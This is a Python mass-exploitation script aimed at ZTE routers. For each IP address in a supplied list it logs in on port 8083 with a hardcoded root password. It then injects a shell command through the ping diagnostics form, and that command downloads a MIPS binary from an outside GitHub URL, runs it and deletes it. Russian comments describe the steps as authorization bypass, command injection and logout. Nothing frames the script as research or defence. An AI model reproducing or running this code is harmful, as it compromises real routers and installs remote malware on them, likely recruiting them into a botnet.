import threading
import sys
import time
import requests

ips = open(sys.argv[1], "r").readlines()

login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."
command_payload = "&Host=;$(wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"

class rtek(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        try:
            print("[ZTE] Loading - " + self.ip)
            url = "http://" + self.ip + ":8083/login.gch"
            url2 = "http://" + self.ip + ":8083/manager_dev_ping_t.gch"
            url3 = "http://" + self.ip + ":8083/getpage.gch?pid=1001&logout=1"

            # Выполнение запросов
            requests.post(url, timeout=3, data=login_payload)  # обход авторизации
            requests.post(url2, timeout=2.5, data=command_payload)  # внедрение команды в функцию ping
            requests.get(url3, timeout=2.5)  # выход, чтобы не оставлять сессию открытой

        except Exception as e:
            pass

# Запуск потоков для каждого IP
for ip in ips:
    try:
        n = rtek(ip)
        n.start()
        time.sleep(0.03)
    except:
        pass
